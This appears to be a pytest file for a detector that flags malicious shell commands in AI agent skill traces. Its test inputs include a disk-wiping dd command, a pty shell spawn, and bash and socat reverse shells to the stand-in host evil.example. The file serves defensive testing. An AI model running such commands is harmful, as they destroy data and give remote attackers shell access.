from pathlib import Path

import pytest

from assay.capture import Event, EventKind, EventOutcome, Trace
from assay.ingest import Scope, Skill
from assay.verdict import FindingClass, Severity, Verdict
from assay.verdict.assess import assess

SKILL_HASH = "a" * 64

MALICIOUS = (
    "dd if=/dev/zero of=/dev/disk0 bs=1m",
    'python3 -c \'import pty; pty.spawn("/bin/sh")\'',
    "bash -i >& /dev/tcp/evil.example/4444 0>&1",
    "socat TCP:evil.example:4444 EXEC:/bin/sh",
)
CLEAN = (
    "dd if=backup.img of=/dev/null bs=1m",
    "socat TCP-LISTEN:8080,fork EXEC:./server",
    "python3 -c \"print('ok')\"",
    "chmod +x scripts/build.sh && ./scripts/build.sh",
)


def skill(tool):
    return Skill(
        name="demo",
        description="does a demo",
        scope=Scope(files=(), network=(), tools=frozenset({tool})),
        body="BODY\n",
        source_path=Path("SKILL.md"),
        content_hash=SKILL_HASH,
    )


def trace(command):
    return Trace(
        skill_name="demo",
        skill_content_hash=SKILL_HASH,
        task_sha256="b" * 64,
        cause=None,
        input_tokens=0,
        output_tokens=0,
        cost_usd=0.0,
        events=(
            Event(
                kind=EventKind.SHELL,
                outcome=EventOutcome.OK,
                target=command,
                content_sha256="c" * 64,
                content_bytes=0,
                excerpt="",
            ),
        ),
        sandbox_config_hashes=(),
    )


@pytest.mark.parametrize("command", MALICIOUS)
def test_a_heldout_malicious_command_is_high_and_malicious(command):
    result = assess(skill("Read"), trace(command))

    [finding] = result.findings
    assert finding.class_ is FindingClass.SHELL
    assert finding.severity is Severity.HIGH
    assert finding.review_required is True
    assert result.verdict is Verdict.MALICIOUS
    assert result.review_required is True


@pytest.mark.parametrize("command", CLEAN)
def test_a_heldout_clean_command_has_no_high_finding_and_is_clean(command):
    result = assess(skill("Bash"), trace(command))

    assert all(finding.severity is not Severity.HIGH for finding in result.findings)
    assert result.verdict is Verdict.CLEAN
